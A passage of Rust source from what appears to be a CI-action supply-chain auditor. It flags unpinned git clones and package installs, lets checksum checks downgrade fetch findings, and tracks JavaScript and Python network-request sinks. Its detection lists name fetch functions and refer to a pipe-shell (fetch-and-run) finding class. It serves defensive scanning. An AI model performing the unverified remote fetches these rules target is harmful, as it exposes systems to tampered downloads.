            NonLiteralFetch::None => {}
        }

        if SH_GIT_CLONE.is_match(line) && !git_clone_has_pinned_ref(line) {
            if git_clone_has_bound_sha_checkout(&logical, li) {
                collector.push_allowed(AuditMatch::new(
                    &audit_patterns::Severity::Medium,
                    &audit_patterns::Category::ShellFetch,
                    action_name,
                    source_file,
                    line_num,
                    line,
                    "followed by SHA checkout",
                ));
            } else {
                collector.push_finding(AuditFinding::new(
                    &audit_patterns::Severity::Medium,
                    &audit_patterns::Category::ShellFetch,
                    action_name,
                    source_file,
                    line_num,
                    line,
                    "git clone without pinned ref — clones HEAD of default branch",
                ));
            }
        }

        for rule in PKG_RULES {
            if rule.regex.is_match(line) && !(rule.is_pinned)(line) {
                push_pkg_finding(rule, line, source_file, line_num, action_name, collector);
            }
        }
    }

    // Suppress saved shell URL fetch findings immediately followed by checksum
    // verification. Pipe-shell and `/latest/` findings are different risk
    // classes and never opt into this downgrade. Offset 0 covers a one-liner
    // `curl -o f … && sha256sum -c …`.
    let mut idx = findings_before;
    while idx < collector.findings.len() {
        let verified = checksum_suppresses_finding(
            &collector.findings[idx],
            &logical,
            base_line,
            &runtime_download_records_through_line,
            &verification_contexts_through_line,
        );
        if verified {
            let finding = collector.findings.remove(idx);
            collector.push_allowed(AuditMatch::from_finding(
                finding,
                "followed by checksum verification",
            ));
        } else {
            idx += 1;
        }
    }
}

fn checksum_suppresses_finding(
    finding: &AuditFinding,
    logical: &[(usize, String)],
    base_line: usize,
    runtime_download_records_through_line: &[Vec<RuntimeDownloadRecord>],
    verification_contexts_through_line: &[Vec<RuntimeVerificationContext>],
) -> bool {
    if finding.finding_kind != Some(audit_patterns::FindingKind::ChecksumSuppressibleShellFetch) {
        return false;
    }
    let Some(finding_line) = finding.line else {
        return false;
    };
    let raw_targets = fetch_output_targets(&finding.pattern_matched);
    if raw_targets.is_empty() {
        return false;
    }
    let rel = finding_line.saturating_sub(base_line);
    logical
        .iter()
        .position(|(start, _)| *start == rel)
        .is_some_and(|li| {
            let Some(targets) =
                canonical_runtime_targets(&raw_targets, &runtime_download_records_through_line[li])
            else {
                return false;
            };
            checksum_within_window(logical, li, &targets, verification_contexts_through_line)
        })
}

fn canonical_runtime_targets(
    raw_targets: &[String],
    records: &[RuntimeDownloadRecord],
) -> Option<Vec<String>> {
    let mut targets = Vec::new();
    for raw_target in raw_targets {
        let normalized = normalize_runtime_artifact_path(raw_target);
        let mut candidates = records
            .iter()
            .filter(|record| normalize_runtime_artifact_path(&record.raw) == normalized)
            .map(|record| record.canonical.as_str());
        let candidate = candidates.next()?;
        if candidate == UNKNOWN_FETCH_OUTPUT || candidates.any(|other| other != candidate) {
            return None;
        }
        targets.push(candidate.to_string());
    }
    Some(targets)
}

fn checksum_within_window(
    logical: &[(usize, String)],
    li: usize,
    targets: &[String],
    verification_contexts_through_line: &[Vec<RuntimeVerificationContext>],
) -> bool {
    (0..=3).any(|offset| {
        let verify_index = li + offset;
        if verify_index >= logical.len() || is_shell_comment_line(&logical[verify_index].1) {
            return false;
        }
        verification_contexts_through_line[verify_index]
            .iter()
            .any(|context| {
                let mut working_directories = vec![None; context.index + 1];
                working_directories[context.index] = context.working_directory.clone();
                targets.iter().all(|target| {
                    checksum_verifies_target_with_material_policy_at(
                        &logical[verify_index].1,
                        target,
                        &context.downloads,
                        context.trust_gpg_verification,
                        &working_directories,
                    )
                })
            })
    })
}

/// Lines longer than this are treated as minified and split on `;` before scanning.
const MINIFIED_LINE_THRESHOLD: usize = 500;
const JS_SINK_MARKERS: &[&str] = &[
    "fetch",
    "axios.get",
    "axios.post",
    "got",
    "got.get",
    "got.post",
    "http.get",
    "https.get",
];
const PY_SINK_MARKERS: &[&str] = &["requests.get", "requests.post", "urllib.request.urlopen"];

struct JavaScriptArrowScope {
    indentation: usize,
    names: HashSet<String>,
    body_started: bool,
    delimiter_depth: usize,
}

pub(crate) fn scan_js_content(
    content: &str,
    source_file: &str,
    action_name: &str,
    collector: &mut AuditCollector,
    config: &Config,
) {
    let mut bindings = HashMap::new();
    let bundled = is_bundled_javascript_source(source_file, content);
    let mut in_block_comment = false;
    let mut pending_sink: Option<(String, usize, bool, HashMap<String, String>)> = None;
    let mut parameter_scopes: Vec<(usize, HashSet<String>)> = Vec::new();
    let mut pending_parameter_signature: Option<(String, bool)> = None;
    let mut unbraced_arrow_scopes: Vec<JavaScriptArrowScope> = Vec::new();
    let mut brace_depth = 0usize;
    for (i, line) in content.lines().enumerate() {
        let line_num = i + 1;
        let code = javascript_line_without_comments(line, &mut in_block_comment);
        let indentation = javascript_indentation(line);
        if !code.trim().is_empty() {
            unbraced_arrow_scopes.retain_mut(|scope| {
                let active = !scope.body_started
                    || scope.delimiter_depth > 0
                    || indentation > scope.indentation;
                if active {
                    scope.body_started = true;
                }
                active
            });
        }
        let leading_closes = code
            .trim_start()
            .chars()
            .take_while(|character| *character == '}')
            .count();
        let visible_depth = brace_depth.saturating_sub(leading_closes);
        parameter_scopes.retain(|(depth, _)| *depth <= visible_depth);

        let mut line_parameter_names = javascript_parameter_names(&code);
        let mut continued_parameter_names = HashSet::new();
        if let Some((mut signature, awaiting_body)) = pending_parameter_signature.take() {
            if awaiting_body && code.trim().is_empty() {
                pending_parameter_signature = Some((signature, true));
            } else {
                signature.push(' ');
                signature.push_str(code.trim());
                continued_parameter_names = javascript_parameter_names(&signature);
                line_parameter_names.extend(continued_parameter_names.iter().cloned());
                if !javascript_parameter_signature_complete(&signature) && !awaiting_body {
                    match javascript_parameter_list_trailing(&signature) {
                        Some(trailing) if trailing.trim().is_empty() => {
                            pending_parameter_signature = Some((signature, true));
                        }
                        Some(_) => {}
                        None => pending_parameter_signature = Some((signature, false)),
                    }
                }
            }
        } else if javascript_parameter_signature_may_continue(&code)
            && !javascript_parameter_signature_complete(&code)
        {
            pending_parameter_signature = Some((code.clone(), false));
        }
        if let Some((prefix, pending_line, report_unresolved, pending_bindings)) =
            pending_sink.take()
        {
            if code.trim().is_empty() {
                pending_sink = Some((prefix, pending_line, report_unresolved, pending_bindings));
            } else {
                let joined = format!("{prefix}{}", code.trim_start());
                if sink_waits_for_argument(&joined, JS_SINK_MARKERS) {
                    pending_sink =
                        Some((joined, pending_line, report_unresolved, pending_bindings));
                    advance_javascript_arrow_scopes(&mut unbraced_arrow_scopes, &code);
                    continue;
                }
                scan_indirect_url_sink(
                    &joined,
                    pending_line,
                    source_file,
                    action_name,
                    collector,
                    config,
                    &pending_bindings,
                    JS_SINK_MARKERS,
                    &JS_URL_PATTERNS,
                    audit_patterns::Category::JavaScriptFetch,
                    "JavaScript",
                    report_unresolved,
                );
                let before = collector.findings.len();
                check_patterns(
                    &JS_PATTERNS,
                    &joined,
                    source_file,
                    pending_line,
                    action_name,
                    collector,
                );
                if collector.findings.len() == before {
                    check_url_patterns(
                        &JS_URL_PATTERNS,
                        &joined,
                        source_file,
                        pending_line,
                        action_name,
                        collector,
                        config,
                    );
                }
            }
        }
        for segment in code_segments(&code) {
            for assignment in top_level_comma_segments(segment) {
                update_literal_url_binding(assignment, &mut bindings);
            }
            let mut scoped_bindings = bindings.clone();
            for (_, names) in &parameter_scopes {
                for name in names {
                    scoped_bindings.remove(name);
                }
            }
            for scope in &unbraced_arrow_scopes {
                for name in &scope.names {
                    scoped_bindings.remove(name);
                }
            }
            for name in &continued_parameter_names {
                scoped_bindings.remove(name);
            }
            invalidate_javascript_parameter_bindings(segment, &mut scoped_bindings);
            if sink_waits_for_argument(segment, JS_SINK_MARKERS) {
                pending_sink = Some((
                    segment.to_string(),
                    line_num,
                    !bundled && line.len() <= MINIFIED_LINE_THRESHOLD,
                    scoped_bindings,
                ));
                continue;
            }
            scan_indirect_url_sink(
                segment,
                line_num,
                source_file,
                action_name,
                collector,
                config,
                &scoped_bindings,
                JS_SINK_MARKERS,
                &JS_URL_PATTERNS,
                audit_patterns::Category::JavaScriptFetch,
                "JavaScript",
                !bundled && line.len() <= MINIFIED_LINE_THRESHOLD,
            );
        }

        let next_depth = javascript_brace_depth_after(&code, brace_depth);
        if !line_parameter_names.is_empty() && next_depth > visible_depth {
            parameter_scopes.push((next_depth, line_parameter_names));
        }
        brace_depth = next_depth;
        advance_javascript_arrow_scopes(&mut unbraced_arrow_scopes, &code);
        if let Some(names) = javascript_unbraced_arrow_parameter_names(&code) {
            unbraced_arrow_scopes.push(JavaScriptArrowScope {
                indentation,
                names,
                body_started: false,
                delimiter_depth: 0,
            });
        }

        if line.len() > MINIFIED_LINE_THRESHOLD {
            for segment in code_segments(line) {
                check_patterns(
                    &JS_PATTERNS,
                    segment,
                    source_file,
                    line_num,
                    action_name,
                    collector,
                );
                check_url_patterns(
                    &JS_URL_PATTERNS,
                    segment,
                    source_file,
                    line_num,
                    action_name,
                    collector,
                    config,
                );
            }
        } else {
            check_patterns(
                &JS_PATTERNS,
                line,
                source_file,
                line_num,
                action_name,
                collector,
            );
            check_url_patterns(
                &JS_URL_PATTERNS,
                line,
                source_file,
                line_num,
                action_name,
                collector,
                config,
            );
        }
    }

    if let Some((pending, pending_line, report_unresolved, pending_bindings)) = pending_sink {
        scan_indirect_url_sink(
            &pending,
            pending_line,
            source_file,
            action_name,
            collector,
            config,
            &pending_bindings,
            JS_SINK_MARKERS,
            &JS_URL_PATTERNS,
            audit_patterns::Category::JavaScriptFetch,
            "JavaScript",
            report_unresolved,
        );
    }
}

fn sink_waits_for_argument(line: &str, markers: &[&str]) -> bool {
    markers.iter().any(|marker| {
        line.match_indices(marker).any(|(index, _)| {
            sink_argument_start(line, marker, index)
                .is_some_and(|start| !sink_first_argument_is_complete(&line[start..]))
        })
    })
}

fn sink_first_argument_is_complete(argument: &str) -> bool {
    let mut quote = None;
    let mut escaped = false;
    let mut parentheses = 0usize;
    let mut brackets = 0usize;
    let mut braces = 0usize;
    for character in argument.chars() {
        if escaped {
            escaped = false;
        } else if quote.is_some() && character == '\\' {
            escaped = true;
        } else if matches!(character, '\'' | '"' | '`') {
            quote = if quote == Some(character) {
                None
            } else {
                quote.or(Some(character))
            };
        } else if quote.is_none() {
            match character {
                '(' => parentheses += 1,
                ')' if parentheses > 0 => parentheses -= 1,
                ')' if brackets == 0 && braces == 0 => return true,
                '[' => brackets += 1,
                ']' => brackets = brackets.saturating_sub(1),
                '{' => braces += 1,
                '}' => braces = braces.saturating_sub(1),
                ',' if parentheses == 0 && brackets == 0 && braces == 0 => return true,
                _ => {}
            }
        }
    }
    false
}

fn javascript_line_without_comments(line: &str, in_block_comment: &mut bool) -> String {
    let mut output = String::with_capacity(line.len());
    let mut characters = line.chars().peekable();
    let mut quote = None;
    let mut escaped = false;
    while let Some(character) = characters.next() {
        if *in_block_comment {
            if character == '*' && characters.peek() == Some(&'/') {
                characters.next();
                *in_block_comment = false;
            }
            continue;
        }
        if let Some(delimiter) = quote {
            output.push(character);
            if escaped {
                escaped = false;
            } else if character == '\\' {
                escaped = true;
            } else if character == delimiter {
                quote = None;
            }
            continue;
        }
        if matches!(character, '\'' | '"' | '`') {
            quote = Some(character);
            output.push(character);
        } else if character == '/' && characters.peek() == Some(&'/') {
            break;
        } else if character == '/' && characters.peek() == Some(&'*') {
            characters.next();
            *in_block_comment = true;
        } else {
            output.push(character);
        }
    }
    output
}

fn is_bundled_javascript_source(source_file: &str, content: &str) -> bool {
    let path = source_file
        .rsplit_once(" (")
        .map_or(source_file, |(_, path)| path.trim_end_matches(')'));
    path.ends_with(".min.js")
        || path.split(['/', '\\']).any(|component| component == "dist")
        || has_esbuild_bundle_prelude(content)
}

fn has_esbuild_bundle_prelude(content: &str) -> bool {
    let mut lexical_state = JavaScriptLexicalState::default();
    let mut common_js = false;
    let mut esm = false;
    let mut to_esm = false;
    for line in content.lines().take(200) {
        let code = javascript_code_without_comments_or_strings(line, &mut lexical_state);
        let code = code.trim_start();
        common_js |= code.starts_with("var __commonJS =");
        esm |= code.starts_with("var __esm =");
        to_esm |= code.starts_with("var __toESM =");
        if lexical_state.saw_template_literal || lexical_state.saw_ambiguous_block_slash {
            return false;
        }
        if common_js && esm && to_esm {
            return true;
        }
    }
    false
}

#[derive(Default)]
struct JavaScriptLexicalState {
    in_block_comment: bool,
    quote: Option<char>,
    escaped: bool,
    template_expression_depths: Vec<Option<usize>>,
    saw_template_literal: bool,
    brace_depth: usize,
    saw_ambiguous_block_slash: bool,
}

fn javascript_code_without_comments_or_strings(
    line: &str,
    state: &mut JavaScriptLexicalState,
) -> String {
    let mut code = String::with_capacity(line.len());
    let mut characters = line.chars().peekable();
    while let Some(character) = characters.next() {
        if state.in_block_comment {
            if character == '*' && characters.peek() == Some(&'/') {
                characters.next();
                state.in_block_comment = false;
            }
            continue;
        }
        if let Some(quote) = state.quote {
            if state.escaped {
                state.escaped = false;
            } else if character == '\\' {
                state.escaped = true;
            } else if character == quote {
                state.quote = None;
            }
            continue;
        }
        if state
            .template_expression_depths
            .last()
            .is_some_and(Option::is_none)
        {
            if state.escaped {
                state.escaped = false;
            } else if character == '\\' {
                state.escaped = true;
            } else if character == '`' {
                state.template_expression_depths.pop();
            } else if character == '$' && characters.peek() == Some(&'{') {
                characters.next();
                *state.template_expression_depths.last_mut().unwrap() = Some(1);
            }
            continue;
        }
        if character == '/' && characters.peek() == Some(&'/') {
            break;
        }
        if character == '/' && characters.peek() == Some(&'*') {
            characters.next();
            state.in_block_comment = true;
        } else if character == '/' && state.brace_depth > 0 {
            state.saw_ambiguous_block_slash = true;
        } else if matches!(character, '\'' | '"') {
            state.quote = Some(character);
        } else if character == '`' {
            state.saw_template_literal = true;
            state.template_expression_depths.push(None);
        } else if let Some(expression) = state.template_expression_depths.last_mut() {
            let depth = (*expression).expect("template expressions have a brace depth");
            match character {
                '{' => *expression = Some(depth + 1),
                '}' if depth == 1 => *expression = None,
                '}' => *expression = Some(depth - 1),
                _ => {}
            }
        } else if character == '{' {
            state.brace_depth += 1;
        } else if character == '}' {
            state.brace_depth = state.brace_depth.saturating_sub(1);
        } else if state.brace_depth == 0 {
            code.push(character);
        }
    }
    state.escaped = false;
    code
}

pub(crate) fn scan_py_content(
    content: &str,
    source_file: &str,
    action_name: &str,
    collector: &mut AuditCollector,
    config: &Config,
) {
    let mut bindings = HashMap::new();
    let mut pending_sink: Option<(String, usize, HashMap<String, String>)> = None;
    let mut parameter_scopes: Vec<(usize, HashSet<String>)> = Vec::new();
    let mut pending_parameter_signature: Option<(String, usize)> = None;
    for (i, line) in content.lines().enumerate() {
        let line_num = i + 1;
        let code = python_line_without_comment(line);
        let indentation = python_indentation(line);
        if !code.trim().is_empty() {
            parameter_scopes.retain(|(scope_indentation, _)| indentation > *scope_indentation);
        }

        let mut line_parameter_names = HashSet::new();
        let mut completed_parameter_scope = None;
        if let Some((mut signature, signature_indentation)) = pending_parameter_signature.take() {
            if code.trim().is_empty() {
                pending_parameter_signature = Some((signature, signature_indentation));
            } else {
                signature.push(' ');
                signature.push_str(code.trim());
                if let Some(names) = python_function_parameter_names(&signature) {
                    line_parameter_names.extend(names.iter().cloned());
                    completed_parameter_scope = Some((signature_indentation, names));
                } else {
                    pending_parameter_signature = Some((signature, signature_indentation));
                }
            }
        } else if python_function_signature_starts(&code) {
            if let Some(names) = python_function_parameter_names(&code) {
                line_parameter_names.extend(names.iter().cloned());
                completed_parameter_scope = Some((indentation, names));
            } else {
                pending_parameter_signature = Some((code.clone(), indentation));
            }
        }

        if let Some((prefix, pending_line, pending_bindings)) = pending_sink.take() {
            if code.trim().is_empty() {
                pending_sink = Some((prefix, pending_line, pending_bindings));
            } else {
                let joined = format!("{prefix}{}", code.trim_start());
                if sink_waits_for_argument(&joined, PY_SINK_MARKERS) {
                    pending_sink = Some((joined, pending_line, pending_bindings));
                    continue;
                }
                scan_indirect_url_sink(
                    &joined,
                    pending_line,
                    source_file,
                    action_name,
                    collector,
                    config,
                    &pending_bindings,
                    PY_SINK_MARKERS,
                    &PY_URL_PATTERNS,
                    audit_patterns::Category::PythonFetch,
                    "Python",
                    true,
                );
                let before = collector.findings.len();
                check_patterns(
                    &PY_PATTERNS,
                    &joined,
                    source_file,
                    pending_line,
                    action_name,
                    collector,
                );
                if collector.findings.len() == before {
                    check_url_patterns(
                        &PY_URL_PATTERNS,
                        &joined,
                        source_file,
                        pending_line,
                        action_name,
                        collector,
                        config,
                    );
                }
            }
        }
        for segment in code_segments(&code) {
            update_literal_url_binding(segment, &mut bindings);
            let mut scoped_bindings = bindings.clone();
            for (_, names) in &parameter_scopes {
                for name in names {
                    scoped_bindings.remove(name);
                }
            }
            for name in &line_parameter_names {
                scoped_bindings.remove(name);
            }
            if sink_waits_for_argument(segment, PY_SINK_MARKERS) {
                pending_sink = Some((segment.to_string(), line_num, scoped_bindings));
                continue;
            }
            scan_indirect_url_sink(
                segment,
                line_num,
                source_file,
                action_name,
                collector,
                config,
                &scoped_bindings,
                PY_SINK_MARKERS,
                &PY_URL_PATTERNS,
                audit_patterns::Category::PythonFetch,
                "Python",
                true,
            );
        }

        if let Some(scope) = completed_parameter_scope {
            parameter_scopes.push(scope);
        }

        check_patterns(
            &PY_PATTERNS,
            &code,
            source_file,
            line_num,
            action_name,
            collector,
        );
        check_url_patterns(
            &PY_URL_PATTERNS,
            &code,
            source_file,
            line_num,
            action_name,
            collector,
            config,
        );
    }

    if let Some((pending, pending_line, pending_bindings)) = pending_sink {
        scan_indirect_url_sink(
            &pending,
            pending_line,
            source_file,
            action_name,
            collector,
            config,
            &pending_bindings,
            PY_SINK_MARKERS,
            &PY_URL_PATTERNS,
            audit_patterns::Category::PythonFetch,
            "Python",
            true,
        );
    }
}

fn python_line_without_comment(line: &str) -> String {
    let mut output = String::with_capacity(line.len());
    let mut quote = None;
    let mut escaped = false;
    for character in line.chars() {
        if escaped {
            output.push(character);
            escaped = false;
        } else if character == '\\' && quote.is_some() {
            output.push(character);
            escaped = true;
        } else if quote == Some(character) {
            output.push(character);
            quote = None;
        } else if quote.is_some() {
            output.push(character);
        } else if matches!(character, '\'' | '"') {
            output.push(character);
            quote = Some(character);
        } else if character == '#' {
            break;
        } else {
            output.push(character);
        }
    }
    output
}

fn python_indentation(line: &str) -> usize {
    line.chars()
        .take_while(|character| matches!(character, ' ' | '\t'))
        .map(|character| if character == '\t' { 4 } else { 1 })
        .sum()
}

fn python_function_signature_starts(line: &str) -> bool {
    let line = line.trim_start();
    let line = line.strip_prefix("async ").unwrap_or(line);
    line.strip_prefix("def ")
        .is_some_and(|signature| signature.contains('('))
}

fn python_function_parameter_names(signature: &str) -> Option<HashSet<String>> {
    let signature = signature.trim_start();
    let signature = signature.strip_prefix("async ").unwrap_or(signature);
    let signature = signature.strip_prefix("def ")?;
    let open = signature.find('(')?;
    let close = matching_closing_parenthesis(signature, open)?;
    if !signature[close + 1..].contains(':') {
        return None;
    }

    let mut names = HashSet::new();
    for parameter in top_level_comma_segments(&signature[open + 1..close]) {
        let parameter = top_level_split_once(parameter, '=')
            .map_or(parameter, |(name, _)| name)
            .trim();
        let parameter = top_level_split_once(parameter, ':')
            .map_or(parameter, |(name, _)| name)
            .trim_start_matches('*')
            .trim();
        if !parameter.is_empty()
            && parameter != "/"
            && parameter.chars().enumerate().all(|(index, character)| {
                character == '_'
                    || character.is_ascii_alphanumeric()
                        && (index > 0 || !character.is_ascii_digit())
            })
        {
            names.insert(parameter.to_string());
        }
    }
    Some(names)
}

fn matching_closing_parenthesis(value: &str, open: usize) -> Option<usize> {
    let mut depth = 1usize;
    let mut quote = None;
    let mut escaped = false;
    for (relative, character) in value[open + 1..].char_indices() {
        if escaped {
            escaped = false;
        } else if quote.is_some() && character == '\\' {
            escaped = true;
        } else if matches!(character, '\'' | '"') {
            quote = if quote == Some(character) {
                None
            } else {
                quote.or(Some(character))
            };
        } else if quote.is_none() {
            match character {
                '(' => depth += 1,
                ')' => {
                    depth -= 1;
                    if depth == 0 {
                        return Some(open + 1 + relative);
                    }
                }
                _ => {}
            }
        }
    }
    None
}

fn update_literal_url_binding(line: &str, bindings: &mut HashMap<String, String>) {
    let Some((left, right)) = line.split_once('=') else {
        return;
    };
    if right.starts_with(['=', '>']) {
        return;
    }
    if right.contains('=') {
        update_literal_url_binding(right, bindings);
    }
    let left = left.trim_end();
    let compound_operator = [
        ">>>", "??", "&&", "||", "**", "//", "<<", ">>", "+", "-", "*", "/", "%", "&", "|", "^",
    ]
    .into_iter()
    .find(|operator| left.ends_with(operator));
    let assignment_left = compound_operator.map_or(left, |operator| {
        left.strip_suffix(operator).unwrap_or(left).trim_end()
    });
    let name = assignment_left
        .split_whitespace()
        .last()
        .unwrap_or_default()
        .trim();
    if name.is_empty()
        || !name.chars().enumerate().all(|(index, c)| {
            c == '_' || c == '$' || c.is_ascii_alphanumeric() && (index > 0 || !c.is_ascii_digit())
        })
    {
        return;
    }

    bindings.remove(name);
    if compound_operator.is_some() {
        return;
    }

    let right = right.trim();
    let replacement = exact_static_url(right)
        .or_else(|| exact_identifier(right).and_then(|source| bindings.get(source).cloned()));

    if let Some(value) = replacement {
        bindings.insert(name.to_string(), value);
    }
}

fn top_level_comma_segments(line: &str) -> Vec<&str> {
    let mut segments = Vec::new();
    let mut start = 0;
    let mut quote = None;
    let mut escaped = false;
    let mut depth = 0usize;
    for (index, character) in line.char_indices() {
        if escaped {
            escaped = false;
        } else if character == '\\' && quote.is_some() {
            escaped = true;
        } else if matches!(character, '\'' | '"' | '`') {
            quote = if quote == Some(character) {
                None
            } else if quote.is_none() {
                Some(character)
            } else {
                quote
            };
        } else if quote.is_none() {
            match character {
                '(' | '[' | '{' => depth += 1,
                ')' | ']' | '}' => depth = depth.saturating_sub(1),
                ',' if depth == 0 => {
                    let segment = line[start..index].trim();
                    if !segment.is_empty() {
                        segments.push(segment);
                    }
                    start = index + 1;
                }
                _ => {}
            }
        }
    }
    let segment = line[start..].trim();
    if !segment.is_empty() {
        segments.push(segment);
    }
    segments
}

fn invalidate_javascript_parameter_bindings(line: &str, bindings: &mut HashMap<String, String>) {
    for name in javascript_parameter_names(line) {
        bindings.remove(&name);
    }
    if let Some(arrow) = line.find("=>") {
        let before = line[..arrow].trim_end();
        if let Some(close) = before.strip_suffix(')')
            && let Some(open) = close.rfind('(')
        {
            remove_parameter_bindings(&close[open + 1..], bindings);
        } else if let Some(name) = before
            .split(|character: char| {
                !character.is_ascii_alphanumeric() && character != '_' && character != '$'
            })
            .next_back()
        {
            bindings.remove(name);
        }
    }

    let mut search = 0;
    while let Some(relative) = line[search..].find("function") {
        let function = search + relative;
        let end = function + "function".len();
        let before = line[..function].chars().next_back();
        let after = line[end..].chars().next();
        search = end;
        if before.is_some_and(is_javascript_identifier_character)
            || after.is_some_and(is_javascript_identifier_character)
        {
            continue;
        }
        let remaining = &line[end..];
        let Some(open) = remaining.find('(') else {
            break;
        };
        let Some(close) = remaining[open + 1..].find(')') else {
            break;
        };
        remove_parameter_bindings(&remaining[open + 1..open + 1 + close], bindings);
        search = end + open + 1 + close + 1;
    }
}

fn is_javascript_identifier_character(character: char) -> bool {
    character == '_' || character == '$' || character.is_ascii_alphanumeric()
}

fn javascript_indentation(line: &str) -> usize {
    line.chars()
        .take_while(|character| matches!(character, ' ' | '\t'))
        .map(|character| if character == '\t' { 4 } else { 1 })
        .sum()
}

fn javascript_unbraced_arrow_parameter_names(line: &str) -> Option<HashSet<String>> {
    let (arrow, _) = line
        .match_indices("=>")
        .filter(|(index, _)| !javascript_position_is_quoted(line, *index))
        .last()?;
    if !line[arrow + 2..].trim().is_empty() {
        return None;
    }

    let mut names = javascript_parameter_names(line);
    if names.is_empty() {
        let name = line[..arrow]
            .trim_end()
            .split(|character: char| !is_javascript_identifier_character(character))
            .next_back()
            .unwrap_or_default();
        if !name.is_empty() && !name.as_bytes()[0].is_ascii_digit() {
            names.insert(name.to_string());
        }
    }
    (!names.is_empty()).then_some(names)
}

fn advance_javascript_arrow_scopes(scopes: &mut [JavaScriptArrowScope], line: &str) {
    for scope in scopes {
        scope.delimiter_depth = javascript_delimiter_depth_after(line, scope.delimiter_depth);
    }
}

fn javascript_delimiter_depth_after(line: &str, initial_depth: usize) -> usize {
    let mut depth = initial_depth;
    let mut quote = None;
    let mut escaped = false;
    for character in line.chars() {
        if escaped {
            escaped = false;
        } else if quote.is_some() && character == '\\' {
            escaped = true;
        } else if matches!(character, '\'' | '"' | '`') {
            quote = if quote == Some(character) {
                None
            } else {
                quote.or(Some(character))
            };
        } else if quote.is_none() {
            match character {
                '(' | '[' | '{' => depth += 1,
                ')' | ']' | '}' => depth = depth.saturating_sub(1),
                _ => {}
            }
        }
    }
    depth
}

fn remove_parameter_bindings(parameters: &str, bindings: &mut HashMap<String, String>) {
    for name in javascript_bound_parameter_names(parameters) {
        bindings.remove(&name);
    }
}

fn javascript_bound_parameter_names(parameters: &str) -> HashSet<String> {
    let mut names = HashSet::new();
    for parameter in top_level_comma_segments(parameters) {
        collect_javascript_binding_pattern(parameter, &mut names);
    }
    names
}

fn collect_javascript_binding_pattern(pattern: &str, names: &mut HashSet<String>) {
    let pattern = top_level_split_once(pattern, '=')
        .map_or(pattern, |(binding, _)| binding)
        .trim();
    let pattern = pattern.strip_prefix("...").unwrap_or(pattern).trim();
    let pattern = top_level_split_once(pattern, ':')
        .map_or(pattern, |(binding, _)| binding)
        .trim();
    if pattern.starts_with('{') && pattern.ends_with('}') {
        for property in top_level_comma_segments(&pattern[1..pattern.len() - 1]) {
            if let Some((_, binding)) = top_level_split_once(property, ':') {
                collect_javascript_binding_pattern(binding, names);
            } else {
                collect_javascript_binding_pattern(property, names);
            }
        }
        return;
    }
    if pattern.starts_with('[') && pattern.ends_with(']') {
        for item in top_level_comma_segments(&pattern[1..pattern.len() - 1]) {
            collect_javascript_binding_pattern(item, names);
        }
        return;
    }
    if let Some(name) = pattern
        .split(|character: char| !is_javascript_identifier_character(character))
        .rfind(|name| {
            !name.is_empty()
                && !name.as_bytes()[0].is_ascii_digit()
                && !matches!(*name, "public" | "private" | "protected" | "readonly")
        })
    {
        names.insert(name.to_string());
    }
}

fn top_level_split_once(value: &str, needle: char) -> Option<(&str, &str)> {
    let mut quote = None;
    let mut escaped = false;
    let mut depth = 0usize;
    for (index, character) in value.char_indices() {
        if escaped {
            escaped = false;
        } else if quote.is_some() && character == '\\' {
            escaped = true;
        } else if matches!(character, '\'' | '"' | '`') {
            quote = if quote == Some(character) {
                None
            } else {
                quote.or(Some(character))
            };
        } else if quote.is_none() {
            match character {
                '(' | '[' | '{' => depth += 1,
                ')' | ']' | '}' => depth = depth.saturating_sub(1),
                _ if character == needle && depth == 0 => {
                    return Some((&value[..index], &value[index + character.len_utf8()..]));
                }
                _ => {}
            }
        }
    }
    None
}

fn javascript_parameter_names(line: &str) -> HashSet<String> {
    let mut names = HashSet::new();
    let bytes = line.as_bytes();
    let mut open = 0usize;
    let mut quote = None;
    let mut escaped = false;
    while open < bytes.len() {
        let character = bytes[open];
        if escaped {
            escaped = false;
            open += 1;
            continue;
        }
        if quote.is_some() && character == b'\\' {
            escaped = true;
            open += 1;
            continue;
        }
        if matches!(character, b'\'' | b'"' | b'`') {
            quote = if quote == Some(character) {
                None
            } else {
                quote.or(Some(character))
            };
            open += 1;
            continue;
        }
        if character != b'(' || quote.is_some() {
            open += 1;
            continue;
        }
        let mut depth = 1usize;
        let mut close = open + 1;
        let mut inner_quote = None;
        let mut inner_escaped = false;
        while close < bytes.len() && depth > 0 {
            let inner = bytes[close];
            if inner_escaped {
                inner_escaped = false;
            } else if inner_quote.is_some() && inner == b'\\' {
                inner_escaped = true;
            } else if matches!(inner, b'\'' | b'"' | b'`') {
                inner_quote = if inner_quote == Some(inner) {
                    None
                } else {
                    inner_quote.or(Some(inner))
                };
            } else if inner_quote.is_none() {
                match inner {
                    b'(' => depth += 1,
                    b')' => depth -= 1,
                    _ => {}
                }
            }
            close += 1;
        }
        if depth != 0 {
            break;
        }
        let trailing = line[close..].trim_start();
        if !(trailing.starts_with('{') || trailing.starts_with("=>")) {
            open = close;
            continue;
        }
        let prefix = line[..open].trim_end();
        let introducer = prefix
            .split(|character: char| !is_javascript_identifier_character(character))
            .next_back()
            .unwrap_or_default();
        if matches!(introducer, "if" | "for" | "while" | "switch" | "with") {
            open = close;
            continue;
        }
        names.extend(javascript_bound_parameter_names(&line[open + 1..close - 1]));
        open = close;
    }
    names
}

fn javascript_parameter_signature_may_continue(line: &str) -> bool {
    let trimmed = line.trim_end();
    if !trimmed.ends_with('(') {
        return false;
    }
    let prefix = trimmed[..trimmed.len() - 1].trim_end();
    prefix.contains("function")
        || prefix.ends_with('=')
        || prefix
            .chars()
            .next_back()
            .is_some_and(is_javascript_identifier_character)
}

fn javascript_parameter_signature_complete(line: &str) -> bool {
    !javascript_parameter_names(line).is_empty()
        || line.contains(')') && (line.contains("=>") || line.contains('{'))
}

fn javascript_parameter_list_trailing(line: &str) -> Option<&str> {
    let bytes = line.as_bytes();
    let open = bytes.iter().position(|character| *character == b'(')?;
    let mut depth = 1usize;
    let mut quote = None;
    let mut escaped = false;
    for index in open + 1..bytes.len() {
        let character = bytes[index];
        if escaped {
            escaped = false;
        } else if quote.is_some() && character == b'\\' {
            escaped = true;
        } else if matches!(character, b'\'' | b'"' | b'`') {
            quote = if quote == Some(character) {
                None
            } else {
                quote.or(Some(character))
            };
        } else if quote.is_none() {
            match character {
                b'(' => depth += 1,
                b')' => {
                    depth -= 1;
                    if depth == 0 {
                        return Some(&line[index + 1..]);
                    }
                }
                _ => {}
            }
        }
    }
    None
}

fn javascript_brace_depth_after(line: &str, initial_depth: usize) -> usize {
    let mut depth = initial_depth;
    let mut quote = None;
    let mut escaped = false;
    for character in line.chars() {
        if escaped {
            escaped = false;
            continue;
        }
        if quote.is_some() && character == '\\' {
